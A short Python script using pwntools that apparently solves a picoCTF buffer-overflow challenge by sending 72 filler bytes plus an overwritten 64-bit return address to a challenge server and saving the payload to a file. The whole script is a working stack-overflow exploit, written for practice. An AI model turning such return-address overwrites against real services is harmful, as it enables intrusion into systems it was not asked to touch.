from pwn import *

FLAG_SIZE = 64

exploit_str = "5" * (FLAG_SIZE + 8)

conn = connect("saturn.picoctf.net", 50690)

print(conn.recvline().decode())

exploit_str = exploit_str.encode() + p64(0x0040123b)

file = open("../pico/x64/64_exploit", "wb")
file.write(exploit_str)
file.close()

print("Sending {}".format(exploit_str))
conn.sendline(exploit_str)

print(conn.recv())

conn.close()
